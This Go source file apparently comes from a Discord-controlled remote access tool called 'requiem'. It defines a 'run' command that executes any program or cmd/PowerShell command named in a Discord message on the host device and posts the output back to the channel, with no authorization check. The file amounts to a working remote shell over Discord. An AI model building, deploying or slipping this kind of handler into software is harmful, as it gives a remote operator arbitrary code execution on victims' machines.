package commands

import (
	"bytes"
	"fmt"
	"strings"

	"requiem/utils"

	"github.com/bwmarrin/discordgo"
)

func (*RunCommand) Exec(ses *discordgo.Session, msg *discordgo.MessageCreate, args []string) {
	if len(args) < 1 {
		ses.ChannelMessageSendReply(msg.ChannelID, "🟥 You need to provide a program to run.", msg.Reference())
		return
	}

	if args[0] == "cmd" {
		args = append([]string{"cmd", "/c"}, args[1:]...)
	}

	if args[0] == "powershell" {
		args = append([]string{"powershell", "-c"}, args[1:]...)
	}

	cmd := utils.StartCommand(args[0], args[1:]...)

	var output bytes.Buffer
	cmd.Stdout = &output

	var error bytes.Buffer
	cmd.Stderr = &error

	err := cmd.Run()
	if err != nil {
		ses.ChannelMessageSendReply(msg.ChannelID, fmt.Sprintf("🟥 Failed to run - %s", err), msg.Reference())
		return
	}

	var response strings.Builder

	if output.Len() > 0 {
		fmt.Fprintf(&response, "🟩 Output:\n```\n%s```\n", output.String())
	}

	if error.Len() > 0 {
		fmt.Fprintf(&response, "🟥 Error:\n```\n%s```", error.String())
	}

	if response.Len() == 0 {
		response.WriteString("No output.")
	}

	ses.ChannelMessageSendReply(msg.ChannelID, response.String(), msg.Reference())
}

func (*RunCommand) Name() string {
	return "run"
}

func (*RunCommand) Info() string {
	return "Run apps on the device."
}

type RunCommand struct{}
